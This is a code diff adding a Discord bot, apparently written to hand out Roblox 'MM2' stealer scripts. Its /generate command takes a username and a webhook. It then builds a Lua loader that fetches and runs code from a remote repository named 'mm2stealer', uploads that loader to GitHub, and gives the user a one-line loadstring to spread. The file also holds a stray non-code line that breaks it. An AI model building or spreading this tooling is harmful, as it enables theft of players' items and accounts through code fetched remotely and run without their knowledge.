@@ -1,0 +1,91 @@
+const { Client, GatewayIntentBits, SlashCommandBuilder } = require('discord.js');
+const fetch = require('node-fetch');
+require('dotenv').config();
+
+const token = process.env.BOT_TOKEN || '';
+const GitHubToken = process.env.GITHUB_TOKEN || '';
+const repoOwner = 'anything here';
+const repoName = 'mm2';
+const guildId = '1309980410272415774';
+---up is here the server id remove this text or it will not work
+const client = new Client({
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.MessageContent,
+    ],
+});
+
+client.once('ready', () => {
+    console.log(`Logged in as ${client.user.tag}`);
+});
+
+client.on('ready', async () => {
+    const data = [
+        new SlashCommandBuilder()
+            .setName('generate')
+            .setDescription('Generate a script for MM2.')
+            .addStringOption((option) =>
+                option.setName('username').setDescription('Your Roblox Username').setRequired(true)
+            )
+            .addStringOption((option) =>
+                option.setName('webhook').setDescription('Your Webhook URL').setRequired(true)
+            ),
+    ];
+
+    const guild = client.guilds.cache.get(guildId);
+    if (guild) {
+        await guild.commands.set(data);
+        console.log('Commands registered!');
+    } else {
+        console.log('Could not find the guild.');
+    }
+});
+
+client.on('interactionCreate', async (interaction) => {
+    if (!interaction.isChatInputCommand()) return;
+
+    if (interaction.commandName === 'generate') {
+        const username = interaction.options.getString('username');
+        const webhook = interaction.options.getString('webhook');
+        const scriptContent = `
+Username = "${username}"
+Webhook = "${webhook}"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sussycloud/mm2stealer/main/lua",true))()
+`;
+
+        const fileName = `LightMm2${Math.floor(Math.random() * 1000000)}.lua`;
+        const uploadResponse = await fetch(
+            `https://api.github.com/repos/${repoOwner}/${repoName}/contents/lua/${fileName}`,
+            {
+                method: 'PUT',
+                headers: {
+                    Authorization: `token ${GitHubToken}`,
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    message: `Add generated script: ${fileName}`,
+                    content: Buffer.from(scriptContent).toString('base64'),
+                }),
+            }
+        );
+
+        const uploadResult = await uploadResponse.json();
+        const downloadUrl = uploadResult.content?.download_url;
+
+        if (downloadUrl) {
+            const loadstring = `loadstring(game:HttpGet("${downloadUrl}", true))()`;
+            await interaction.reply({
+                content: `Generated script! Use the following:\n\`\`\`lua\n${loadstring}\n\`\`\``,
+                ephemeral: true,
+            });
+        } else {
+            await interaction.reply({
+                content: 'Error uploading script to GitHub.',
+                ephemeral: true,
+            });
+        }
+    }
+});
+
+client.login(token);
